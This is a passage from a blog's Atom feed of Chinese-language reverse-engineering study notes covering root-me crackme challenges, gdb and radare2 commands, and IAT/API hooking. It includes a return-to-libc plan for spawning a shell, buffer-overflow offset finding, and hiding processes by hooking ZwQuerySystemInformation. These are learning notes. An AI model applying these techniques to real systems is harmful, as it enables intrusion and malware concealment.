$ebx</code><br>二进制打印寄存器</p><hr><pre><code>set $ZF = 6set $eflags |= (1 &lt;&lt; $ZF)</code></pre><p>设定ZF值为1</p><hr><p><code>show</code></p><hr><p><code>where</code><br>显示当前位置</p><hr><p><code>MOVZX</code> 指令（进行全零扩展并传送）将源操作数复制到目的操作数，并把目的操作数 扩展到 16 位或 32 位。</p><hr><h3 id="r2-图形模式下，如何跳转和返回函数"><a href="#r2-图形模式下，如何跳转和返回函数" class="headerlink" title="r2 图形模式下，如何跳转和返回函数"></a>r2 图形模式下，如何跳转和返回函数</h3><p>图形模式下，按<code>o</code>进行跳转<br>按<code>u</code>返回上一个函数</p><hr><p>ff07031d6fb052490149f44b1d5e94f1592b6bac93c06ca9</p><p>25260060504_VE_T25_<em>t</em>_</p><hr><p><code>Usage: jump LOCATION</code><br>Give as argument either LINENUM or *ADDR, where ADDR is an express</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ELF-x86-No-software-breakpoints&quot;&gt;&lt;a href=&quot;#ELF-x86-No-software-breakpoints&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - No software breakpoints&quot;&gt;&lt;/a&gt;ELF x86 - No software breakpoints&lt;/h2&gt;&lt;h3 id=&quot;看反汇编，大致了解过程&quot;&gt;&lt;a href=&quot;#看反汇编，大致了解过程&quot; class=&quot;headerlink&quot; title=&quot;看反汇编，大致了解过程&quot;&gt;&lt;/a&gt;看反汇编，大致了解过程&lt;/h3&gt;&lt;p&gt;这是众所周知的&lt;code&gt;反调试&lt;/code&gt;技术，它不能在应用程序本身中&lt;code&gt;放置任何软件断点&lt;/code&gt;。因为当我们在&lt;code&gt;用户模式&lt;/code&gt;应用程序中遇到&lt;code&gt;断点&lt;/code&gt;时，代码中将放入&lt;code&gt;0xCC（int3）&lt;/code&gt;，因此计算将是错误的，并将生成错误的&lt;code&gt;校验和&lt;/code&gt;.&lt;br&gt;
    
    </summary>
    
    
      <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>逆向_root_me_2</title>
    <link href="http://finsenty54.github.io/2020/10/07/%E9%80%86%E5%90%91_root_me_2/"/>
    <id>http://finsenty54.github.io/2020/10/07/逆向_root_me_2/</id>
    <published>2020-10-07T06:27:22.000Z</published>
    <updated>2020-10-07T06:29:06.581Z</updated>
    
    <content type="html"><![CDATA[<h2 id="逆向-root-me"><a href="#逆向-root-me" class="headerlink" title="逆向 root_me"></a>逆向 root_me</h2><h3 id="PE-NET"><a href="#PE-NET" class="headerlink" title="PE .NET"></a>PE .NET</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/PE-DotNet-0-protection" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Cracking/PE-DotNet-0-protection</a></p><a id="more"></a><h3 id="MIPS-ELF-MIPS-Basic-Crackme"><a href="#MIPS-ELF-MIPS-Basic-Crackme" class="headerlink" title="MIPS. ELF MIPS - Basic Crackme"></a>MIPS. ELF MIPS - Basic Crackme</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/ELF-MIPS-Basic-Crackme" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Cracking/ELF-MIPS-Basic-Crackme</a></p><p>在MIPS架构中，“ $ ra”寄存器保存返回地址，类似于x86指令指针“ EIP”</p><h3 id="ELF-fake-instrucations"><a href="#ELF-fake-instrucations" class="headerlink" title="ELF  fake instrucations"></a>ELF  fake instrucations</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/ELF-x86-No-software-breakpoints" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Cracking/ELF-x86-No-software-breakpoints</a></p><pre><code>dis main  gdb-peda$ set disassembly-flavor intel //汇编用intel语言显示gdb-peda$ i r $edx //显示edx值ni //ni/si都是汇编级别的断点定位。si会进入汇编和C函数内部,ni不会//这两个命令（si/ni）所针对的是汇编指令，而s/n针对的是源代码</code></pre><p><code>jz</code> 表示当<code>zf =1</code>时跳转，即结果为0跳转。<br><code>jnz</code> 即 <code>zf=0</code>时跳转，即结果不为0 跳转。</p><pre><code>gdb-peda$ i r //全显示gdb-peda$ set $eax=0gdb-peda$ x/s $eax //查看寄存器指向的内容call WPA(&quot;toto&quot;, &quot;toto&quot;) //直接在gdb中运行命令？？</code></pre><h3 id="ELF-ptrace"><a href="#ELF-ptrace" class="headerlink" title="ELF ptrace"></a>ELF ptrace</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/ELF-x86-Ptrace" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Cracking/ELF-x86-Ptrace</a></p><p><em>Load the application into <code>IDA pro</code>,search main function,press <code>F5</code>to disassemble it,get the code below:</em><br><code>IDA 按F5 反编译 生成伪代码</code></p><hr><p><code>r2 -ww ./ch3.bin</code></p><pre><code>-w           open file in write modeww foobar            write wide string &apos;f\x00o\x00o\x00b\x00a\x00r\x00&apos;wx 9090     write two intel nops</code></pre><p><code>[0x080482f0]&gt; wx eb @ 0x0804841A</code><br>Short Jump（短跳转）机器码 EB</p><p><code>pd N             disassemble N instructions</code></p><pre><code>gdb-peda$ i b set $al=$dl </code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;逆向-root-me&quot;&gt;&lt;a href=&quot;#逆向-root-me&quot; class=&quot;headerlink&quot; title=&quot;逆向 root_me&quot;&gt;&lt;/a&gt;逆向 root_me&lt;/h2&gt;&lt;h3 id=&quot;PE-NET&quot;&gt;&lt;a href=&quot;#PE-NET&quot; class=&quot;headerlink&quot; title=&quot;PE .NET&quot;&gt;&lt;/a&gt;PE .NET&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://www.root-me.org/en/Challenges/Cracking/PE-DotNet-0-protection&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.root-me.org/en/Challenges/Cracking/PE-DotNet-0-protection&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>逆向工程核心原理_little_summary</title>
    <link href="http://finsenty54.github.io/2020/10/06/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86_little_summary/"/>
    <id>http://finsenty54.github.io/2020/10/06/逆向工程核心原理_little_summary/</id>
    <published>2020-10-06T06:18:05.000Z</published>
    <updated>2020-10-06T06:19:13.677Z</updated>
    
    <content type="html"><![CDATA[<h3 id="INT-和-IAT"><a href="#INT-和-IAT" class="headerlink" title="INT 和 IAT"></a>INT 和 IAT</h3><p>INT  是rva数组，INT表示数组首地址 数组元素是一个地址 指向由一个2字节ordinall地址和函数名称组成的结构体  第一个值地址指向第一个结构体</p><p>如果IAT存在于 选择头中IAT表明的地址中 相应没有写权限也没事</p><p>INT和IAT指向内容有时相同 表示地址肯定不同 因为保存在不同地址 所指内容相同</p><a id="more"></a><hr><h3 id="进程内存转储"><a href="#进程内存转储" class="headerlink" title="进程内存转储"></a>进程内存转储</h3><p>OLLYGDB插件？？ dump命令<br>是解压缩运行时，将内存转为文件，方便查看</p><hr><h3 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h3><p>使用CALL指令将接下来的在代码间的字符串数据地址压入栈，然后直接接下来运行命令</p><p>CALL EAX<br>EAX保存函数地址<br>32位保存返回内容</p><hr><h3 id="top-命令-linux"><a href="#top-命令-linux" class="headerlink" title="top 命令 (linux)"></a>top 命令 (linux)</h3><p>查看 CPU 时间在 User space 与 Kernel Space 之间的分配情况</p><hr><h3 id="SEH链"><a href="#SEH链" class="headerlink" title="SEH链"></a>SEH链</h3><p>ollydbg VIEW-SEH CHAIN</p><hr><h3 id="API钩取"><a href="#API钩取" class="headerlink" title="API钩取"></a>API钩取</h3><p>windows 中内核模式所有代码共用一个虚拟空间地址，用API传<br>e1 = 9Fh =&gt; 0fh*2^7 = 780h</p><p>使用常规系统资源的API会经由kernel32.dll和ntdll.dll不断向下调用，最后经由SYSENTER命令进入内核模式</p><p><img src="https://s1.ax1x.com/2020/10/06/0N35f1.png" alt="0N35f1.png"></p><hr><p><img src="https://s1.ax1x.com/2020/10/06/0N3vtA.png" alt="0N3vtA.png"></p><hr><h3 id="动态方法常用-调试和注入"><a href="#动态方法常用-调试和注入" class="headerlink" title="动态方法常用 调试和注入"></a>动态方法常用 调试和注入</h3><h4 id="方法1：调试"><a href="#方法1：调试" class="headerlink" title="方法1：调试"></a>方法1：调试</h4><p>异常必须处理为EXCEPTION_BREAKPOINT 汇编指令为int 3 IA-32指令为0xCC </p><p>用异常获取API的控制</p><p>线程上下文，（执行完一个线程时间片，执行另一个），也就是各个寄存器信息，保存在CONTEXT结构体中。</p><p>CONTEXT.esp</p><p>api钩取 获取某个API的控制权</p><h4 id="方法2：DLL注入"><a href="#方法2：DLL注入" class="headerlink" title="方法2：DLL注入"></a>方法2：DLL注入</h4><p>setwindowstextA 表示ASCII<br>setwindowstextW 表示宽字符 win中为Unicode码</p><h3 id="IAT钩取"><a href="#IAT钩取" class="headerlink" title="IAT钩取"></a>IAT钩取</h3><p>通过注入DLL，修改IAT中指向某API的地址改为指向自己API的地址，自己的函数再去调用某API，来达到修改的目的</p><hr><h3 id="搜索API"><a href="#搜索API" class="headerlink" title="搜索API"></a>搜索API</h3><p><strong>在用ollydng进行内部模块call 搜索时，先选取对的模块。右键-select moudle</strong><br>在用ollydbg 中<code>search for name</code>命令</p><hr><h3 id="API代码修改"><a href="#API代码修改" class="headerlink" title="API代码修改"></a>API代码修改</h3><p>将API头五个字节 修改 为JMP XXXXXXXX<br>即跳转到注入的函数中</p><p>通过将ntdll.ZwQuerySystemInformation() 函数形成的链表中删除进程信息即可做到隐藏相关进程。</p><h3 id="全局API钩取"><a href="#全局API钩取" class="headerlink" title="全局API钩取"></a>全局API钩取</h3><p>通过修改ntdll.ZwResumeThread() API</p><h3 id="热补丁-hot-patch"><a href="#热补丁-hot-patch" class="headerlink" title="热补丁 hot patch"></a>热补丁 hot patch</h3><p>修改7字节代码<br>1.二次跳转<br>两字节跳到指令上面，用五字节跳到自己的函数地址<br>2.不用脱钩，地址+2字节，就可正常运行</p><p>ia-32 E9 表示far jmp 五字节。<br><code>E9 XXXXXXXX=要跳转的地址-当前指令地址-当前指令长度（5）</code></p><p>EB 表示 short jmp 两字节<br>依托当前EIP 在-128~127范围间跳转<br><code>XX=要跳转的地址-当前指令地址-当前指令长度（2）</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;INT-和-IAT&quot;&gt;&lt;a href=&quot;#INT-和-IAT&quot; class=&quot;headerlink&quot; title=&quot;INT 和 IAT&quot;&gt;&lt;/a&gt;INT 和 IAT&lt;/h3&gt;&lt;p&gt;INT  是rva数组，INT表示数组首地址 数组元素是一个地址 指向由一个2字节ordinall地址和函数名称组成的结构体  第一个值地址指向第一个结构体&lt;/p&gt;
&lt;p&gt;如果IAT存在于 选择头中IAT表明的地址中 相应没有写权限也没事&lt;/p&gt;
&lt;p&gt;INT和IAT指向内容有时相同 表示地址肯定不同 因为保存在不同地址 所指内容相同&lt;/p&gt;
    
    </summary>
    
    
      <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>ch25.bin</title>
    <link href="http://finsenty54.github.io/2020/10/05/ch25bin/"/>
    <id>http://finsenty54.github.io/2020/10/05/ch25bin/</id>
    <published>2020-10-05T11:13:34.000Z</published>
    <updated>2020-10-05T11:14:23.029Z</updated>
    
    <content type="html"><![CDATA[<h2 id="逆向-root-me"><a href="#逆向-root-me" class="headerlink" title="逆向 root_me"></a>逆向 root_me</h2><h3 id="ch25-bin"><a href="#ch25-bin" class="headerlink" title="ch25.bin"></a>ch25.bin</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/ELF-C-0-protection?lang=en" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Cracking/ELF-C-0-protection?lang=en</a><br><a id="more"></a></p><h4 id="识别C-类"><a href="#识别C-类" class="headerlink" title="识别C++类"></a>识别C++类</h4><p>如何识别软件是用C++所写？<br>1 频繁使用ECX 保存this 指针 ，指向类对象，如在调用函数前<br>2 虚函数 要先知道类虚函数表，然后得到实际值，也是传到ECX中<br>3 使用STL code 可用IDA imports查看</p><h4 id="类怎么在内存中存储"><a href="#类怎么在内存中存储" class="headerlink" title="类怎么在内存中存储"></a>类怎么在内存中存储</h4><p>每个变量四字节<br>不足要对齐<br>内存中排列与定义相同</p><hr><p>虚函数表要在最开头<br>表包含虚函数地址，按定义排序</p><p><strong>如果继承另一个类</strong></p><p>继承多个类<br><strong>虚表按顺序排序</strong></p><hr><h4 id="识别类"><a href="#识别类" class="headerlink" title="识别类"></a>识别类</h4><h5 id="1-识别构建和撤销"><a href="#1-识别构建和撤销" class="headerlink" title="1 识别构建和撤销"></a>1 识别构建和撤销</h5><h6 id="1-1-全局变量"><a href="#1-1-全局变量" class="headerlink" title="1.1 全局变量"></a>1.1 全局变量</h6><p>在编译时 保存到（PE）文件的数据段<br>构建在main()前调用</p><h6 id="用this调用全局变量，在EP和main-间，确定为构建"><a href="#用this调用全局变量，在EP和main-间，确定为构建" class="headerlink" title="用this调用全局变量，在EP和main()间，确定为构建"></a>用this调用全局变量，在EP和main()间，确定为构建</h6><p>1.2局部变量<br>指针指向未初始化的栈变量</p><h6 id="1-3动态分配变量-new-）"><a href="#1-3动态分配变量-new-）" class="headerlink" title="1.3动态分配变量 new(）"></a>1.3动态分配变量 new(）</h6><p>堆上分配</p><h5 id="2多态类识别"><a href="#2多态类识别" class="headerlink" title="2多态类识别"></a>2多态类识别</h5><h6 id="2-1鉴别多态通过RTTI，其可以让对象在运行时确定类型。"><a href="#2-1鉴别多态通过RTTI，其可以让对象在运行时确定类型。" class="headerlink" title="2.1鉴别多态通过RTTI，其可以让对象在运行时确定类型。"></a>2.1鉴别多态通过RTTI，其可以让对象在运行时确定类型。</h6><p>RTTICompleteObjectLocator pointer</p><hr><p>TypeDescriptor<br>指向的结构包含类名</p><hr><p>RTTIClassHierarchyDescriptor</p><hr><p>RTTIBaseClassDescriptor</p><hr><p>vftable<br>vbtable (virtual base class table)</p><hr><h3 id="指令E9"><a href="#指令E9" class="headerlink" title="指令E9"></a>指令<code>E9</code></h3><p>指令<code>E9</code>相对寻址<br>e9 xxxxxxxx<br><code>xxxxxxxx=要跳转的地址-当前指令地址-当前指令长度（5）</code><br>e9 00 00 00 00  即跳转到下一个地址<br>402005-402000-5=000000</p><h3 id="指令EB"><a href="#指令EB" class="headerlink" title="指令EB"></a>指令<code>EB</code></h3><p><code>EB</code>表示short jmp命令，进行短距离跳转<br>eb xx</p><hr><h3 id="指令setne"><a href="#指令setne" class="headerlink" title="指令setne"></a>指令setne</h3><p><strong>set  if  not  equal</strong><br>setne cl<br>if ZF=1 then cl=0<br>if ZF=0 then cl=1</p><p>strings 命令<br>display printable strings in [file(s)] (stdin by default)</p><hr><h3 id="破解方法1"><a href="#破解方法1" class="headerlink" title="破解方法1"></a>破解方法1</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ gdb ./ch25.bin </span><br><span class="line">(gdb) <span class="built_in">set</span> args toto <span class="comment">//设置输入参数toto</span></span><br><span class="line">(gdb) b main <span class="comment">//在main设置断点</span></span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x8048a95</span> </span><br><span class="line">(gdb) r  <span class="comment">//运行程序（到断点）</span></span><br><span class="line">Breakpoint <span class="number">1</span>, <span class="number">0x08048a95</span> <span class="function">in <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="params">(gdb)</span>disass <span class="comment">//显示汇编代码</span></span></span><br><span class="line">(gdb) b *main+268</span><br><span class="line">gdb)c 继续执行</span><br><span class="line">(gdb) layout prev 可以查看堆栈和汇编代码</span><br><span class="line">(gdb) x/<span class="number">1</span>xw $eax</span><br><span class="line">“ x / <span class="number">1</span>xw $ eax命令在EAX寄存器中包含的地址处显示<span class="number">1</span>个十六进制格式的<span class="number">16</span>位字</span><br><span class="line">(gdb) x/<span class="number">1</span>s <span class="number">0X08050b24</span></span><br><span class="line">查看该地址值</span><br></pre></td></tr></table></figure><h3 id="破解方法2"><a href="#破解方法2" class="headerlink" title="破解方法2"></a>破解方法2</h3><p><code>radare2</code> 类似IDA<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r2 ch25.bin</span><br><span class="line">aaa <span class="comment">//分析函数，参数...</span></span><br><span class="line">VV @main <span class="comment">//使用 VV 进入 图形化模式（需要是函数范围内）。</span></span><br><span class="line">pdf @ main <span class="comment">//分析后就可以正常打印函数代码了（pdf 打印函数代码）</span></span><br></pre></td></tr></table></figure></p><p>peda是GDB的一个插件<br><a href="https://github.com/longld/peda" target="_blank" rel="noopener">https://github.com/longld/peda</a></p><p>gdb-peda$ run jlkd 带参数运行</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;逆向-root-me&quot;&gt;&lt;a href=&quot;#逆向-root-me&quot; class=&quot;headerlink&quot; title=&quot;逆向 root_me&quot;&gt;&lt;/a&gt;逆向 root_me&lt;/h2&gt;&lt;h3 id=&quot;ch25-bin&quot;&gt;&lt;a href=&quot;#ch25-bin&quot; class=&quot;headerlink&quot; title=&quot;ch25.bin&quot;&gt;&lt;/a&gt;ch25.bin&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://www.root-me.org/en/Challenges/Cracking/ELF-C-0-protection?lang=en&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.root-me.org/en/Challenges/Cracking/ELF-C-0-protection?lang=en&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>逆向 学习r2 part2</title>
    <link href="http://finsenty54.github.io/2020/09/27/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0r2part2/"/>
    <id>http://finsenty54.github.io/2020/09/27/逆向学习r2part2/</id>
    <published>2020-09-27T11:19:49.000Z</published>
    <updated>2020-09-27T11:20:33.245Z</updated>
    
    <content type="html"><![CDATA[<h2 id="逆向-学习r2-part2"><a href="#逆向-学习r2-part2" class="headerlink" title="逆向 学习r2 part2"></a>逆向 学习r2 part2</h2><p><a href="https://www.megabeets.net/a-journey-into-radare-2-part-2/" target="_blank" rel="noopener">https://www.megabeets.net/a-journey-into-radare-2-part-2/</a></p><p>在NX和ASLR的保护下</p><hr><a id="more"></a><p><code>$ r2 -d megabeets_0x2</code><br><code>-d</code> – Open in the debug mode<br>aas – Analyze functions, symbols and more</p><p><code>dcu address      Continue until address</code></p><p><code>VV</code></p><p><code>pdf @ sym.beet</code></p><hr><h3 id="ragg2"><a href="#ragg2" class="headerlink" title="ragg2"></a>ragg2</h3><p><code>ragg2</code>, which allows us to generate a cyclic pattern called De Bruijn Sequence and check the exact offset where our payload overrides the buffer.<br>它允许我们生成一个称为De Bruijn Sequence的循环模式，并检查有效载荷覆盖缓冲区的确切偏移量</p><pre><code>-P [size]       prepend debruijn pattern -q [fragment]   debruijn pattern offset -r              show raw bytes instead of hexpairs</code></pre><p><code>$ ragg2 -P 100 -r</code><br><em>之前SEH攻击 应该有用过</em></p><hr><h3 id="rarun2"><a href="#rarun2" class="headerlink" title="rarun2"></a>rarun2</h3><p><code>rarun2</code>用作启动器，用于运行具有不同环境，参数，权限，目录的程序，并覆盖默认文件描述符（例如stdin）。<br>当您必须使用长参数运行程序，将大量数据传递给stdin或类似的东西时，这很有用，这通常是利用二进制文件的情况。</p><hr><pre><code>$ ragg2 -P 200 -r &gt; pattern.txt$ cat pattern.txt</code></pre><hr><pre><code>$ vim profile.rr2$ cat profile.rr2#!/usr/bin/rarun2stdin=./pattern.txt</code></pre><hr><p><code>$ r2 -r profile.rr2 -d megabeets_0x2</code><br>-r [rarun2]  specify rarun2 profile to load (same as -e dbg.profile=X)<br>-d           debug the executable ‘file’ or running process ‘pid’</p><hr><p>信号是发送到同一进程中的某个进程或特定线程的异步通知，以便将发生的事件通知给它。<br>·当SIGSEGV（11）信号做出无效的虚拟内存引用或分段错误时，即在执行分段违规时，将其发送到进程。</p><hr><p><code>wopO value</code>       Finds the given value into a De Bruijn Pattern at current offset</p><p>| dr                     Show ‘gpr’ registers<br>wopO <code>dr eip</code><br>没有成功<br>wopO 0x41417641</p><hr><p>i   Get info from opened file (see rabin2’s manpage)<br>ii                 Imports<br>iip 更简明</p><hr><p>The plan</p><ol><li>Leak the real address of puts</li><li>Calculate the base address of libc</li><li>Calculate the address of system</li><li>Find an address in libc that contains the string /bin/sh</li><li>Call system with /bin/sh and spawn a shell</li></ol><hr><p><code>过程链接表Procedure Linkage Table（PLT)</code>是一个内存结构，其中包含外部功能的代码存根，这些函数的地址在链接时是未知的。<br>·每当我们在.text段中看到对函数的CALL指令时，都不会直接调用该函数。<br>·相反，它在PLT处调用存根代码，例如<code>func_name @ plt</code>。<br>然后，存根跳转到<code>全局偏移表（GOT）</code>中为此功能列出的地址。<br>如果它是此功能的第一个CALL，则<code>GOT条目将指向PLT，后者将调用动态链接器，该链接器将解析所需功能的实际地址</code><br>下次调用func_name @ plt时，存根直接从<code>GOT获取功能地址</code>。<br>((少了动态链接步骤？？))</p><hr><p><code>pwntools</code>漏洞利用框架</p><hr><pre><code>~ character is radare’s internal grep[0xf7763b30]&gt; # the address of puts@plt:[0xf7763b30]&gt; ?v sym.imp.puts //Usage: ?v[id][ num]  # Show value0x08048390[0xf7763b30]&gt; ?v reloc.puts</code></pre><p><code>sy按tab键自动搜寻</code></p><hr><pre><code>Usage: dmi    # List/Load SymbolsAll these paddr=0x000xxxxx are the offsets of the function from libc base. </code></pre><hr><p>为此，我们将使用radare的搜索功能。<br>·默认情况下，radare正在dbg.map中搜索，这是当前的内存映射。<br>·我们要搜索所有内存映射，因此我们需要对其进行配置：<br>[0x080483d0]&gt; e search.in = dbg.maps<br>要以可视方式配置雷达，请使用Ve</p><hr><pre><code>Usage: /[!bf] [arg]  Search stuffdmm   List modules of target process[0x080483d0]&gt; ?X 0xf7700768-0xf7599000</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;逆向-学习r2-part2&quot;&gt;&lt;a href=&quot;#逆向-学习r2-part2&quot; class=&quot;headerlink&quot; title=&quot;逆向 学习r2 part2&quot;&gt;&lt;/a&gt;逆向 学习r2 part2&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.megabeets.net/a-journey-into-radare-2-part-2/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.megabeets.net/a-journey-into-radare-2-part-2/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在NX和ASLR的保护下&lt;/p&gt;
&lt;hr&gt;
    
    </summary>
    
    
      <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>学习r2</title>
    <link href="http://finsenty54.github.io/2020/09/24/%E5%AD%A6%E4%B9%A0r2/"/>
    <id>http://finsenty54.github.io/2020/09/24/学习r2/</id>
    <published>2020-09-24T08:29:04.000Z</published>
    <updated>2020-09-24T08:30:03.440Z</updated>
    
    <content type="html"><![CDATA[<h2 id="逆向-学习r2"><a href="#逆向-学习r2" class="headerlink" title="逆向 学习r2"></a>逆向 学习r2</h2><h3 id="RABIN2-—-Binary-program-info-extractor"><a href="#RABIN2-—-Binary-program-info-extractor" class="headerlink" title="RABIN2 — Binary program info extractor"></a>RABIN2 — Binary program info extractor</h3><pre><code>$ rabin2 -I megabeets_0x1</code></pre><p><code>stripped false</code><br>没有剥离符号表<br><code>static   false</code> //所以是动态链接<br><a id="more"></a></p><h3 id="r2-radare2"><a href="#r2-radare2" class="headerlink" title="r2 //radare2"></a>r2 //radare2</h3><h4 id="ie"><a href="#ie" class="headerlink" title="ie"></a>ie</h4><pre><code>[0x08048370]&gt; ie</code></pre><p>ie 命令可以打印出程序的入口点</p><hr><h4 id><a href="#" class="headerlink" title="?"></a>?</h4><p>在任何一个命令后面添加 ? 来获得更多的子命令信息：<br>    [0x08048370]&gt; i?</p><hr><h4 id="aa"><a href="#aa" class="headerlink" title="aa"></a>aa</h4><p>使用 ‘aa’ 命令来分析文件</p><pre><code>[0x08048370]&gt; a?</code></pre><p>aa?<br>aaa[?]              autoname functions after aa (see afna)</p><hr><h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>flag 是所有类似特征的集合，展示所有的 flag ，用 ‘fs’ 命令<br>    [0x08048370]&gt; fs</p><h4 id="f"><a href="#f" class="headerlink" title="f"></a>f</h4><p> f         list flags (will only list flags from selected flagspaces<br>    [0x08048370]&gt; fs imports; f</p><hr><h4 id="iz"><a href="#iz" class="headerlink" title="iz"></a>iz</h4><p>iz – 列出数据段里的字符串</p><hr><h4 id="axt"><a href="#axt" class="headerlink" title="axt"></a>axt</h4><pre><code>[0x08048370]&gt; axt @@ str.*</code></pre><p> axt [addr]      find data/code references to this address</p><p><code>@@                   # foreach iterator command:</code></p><hr><h4 id="x"><a href="#x" class="headerlink" title="x"></a>x</h4><p>| x @@ sym.*          run ‘x’ over all flags matching ‘sym.’ in current flagspace</p><hr><h4 id="s"><a href="#s" class="headerlink" title="s"></a>s</h4><p>s    # Help for the seek commands. See ?$? to see all variables</p><hr><h4 id="afl"><a href="#afl" class="headerlink" title="afl"></a>afl</h4><p>af?<br>用 ‘afl’ 指令，这个指令代表着分析函数列表（Analyze Functions List）.</p><hr><h4 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h4><p>s main<br>用 ‘pdf’（输出反汇编代码）</p><hr><h4 id="m"><a href="#m" class="headerlink" title="m"></a>m</h4><p>m<key> 可以用来标记特定的偏移地址，之后输入对应的key就可以跳转到你设置的地方.</key></p><hr><h4 id="V"><a href="#V" class="headerlink" title="V"></a>V</h4><p>V 视图模式<br>shell 里输入 VV来进入图形模式</p><hr><p>f sym.<tab> 来定位出 sym.beet 函数<br>pdf @ sym.beet 命令，‘@’ 表示临时查找<br>可视视图界面直接跳转到 beet 函数<br>上面说过的方框中的数字吗？这里直接按 3 就可以了<br> gd 命令，d 就是每一个跳转或者调用代码旁边的 字母</tab></p><hr><h4 id="ahi"><a href="#ahi" class="headerlink" title="ahi"></a>ahi</h4><p>:&gt; ahi s @@=0x080485a3 0x080485ad 0x080485b7<br>ahi s       set base to string (1)<br>ahi s 是用来设置字符串特定的偏移地址<br>@@是一个迭代器，可以用来接受后面输入的多个参数,执行完这条命令后</p><hr><h4 id="r"><a href="#r" class="headerlink" title="r"></a>r</h4><p>r 图形模式刷新</p><hr><h3 id="rahash2"><a href="#rahash2" class="headerlink" title="rahash2"></a>rahash2</h3><p>rahash2 包含很多种算法来求证一个文件或者字符串的校验值,具体的用法请使用 ‘man rahash2 ‘.</p><hr><h4 id="00"><a href="#00" class="headerlink" title="00"></a>00</h4><p>oo           reopen current file<br>ood [args]      # reopen in debug mode (with args)</p><hr><h4 id="dc"><a href="#dc" class="headerlink" title="dc"></a>dc</h4><p>dc   Execution continuation commands<br>| dc                           Continue execution of all children</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;逆向-学习r2&quot;&gt;&lt;a href=&quot;#逆向-学习r2&quot; class=&quot;headerlink&quot; title=&quot;逆向 学习r2&quot;&gt;&lt;/a&gt;逆向 学习r2&lt;/h2&gt;&lt;h3 id=&quot;RABIN2-—-Binary-program-info-extractor&quot;&gt;&lt;a href=&quot;#RABIN2-—-Binary-program-info-extractor&quot; class=&quot;headerlink&quot; title=&quot;RABIN2 — Binary program info extractor&quot;&gt;&lt;/a&gt;RABIN2 — Binary program info extractor&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;$ rabin2 -I megabeets_0x1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;stripped false&lt;/code&gt;&lt;br&gt;没有剥离符号表&lt;br&gt;&lt;code&gt;static   false&lt;/code&gt; //所以是动态链接&lt;br&gt;
    
    </summary>
    
    
      <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>ARM内联汇编</title>
    <link href="http://finsenty54.github.io/2020/09/24/ARM%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/"/>
    <id>http://finsenty54.github.io/2020/09/24/ARM内联汇编/</id>
    <published>2020-09-24T00:34:38.000Z</published>
    <updated>2020-09-24T00:41:34.491Z</updated>
    
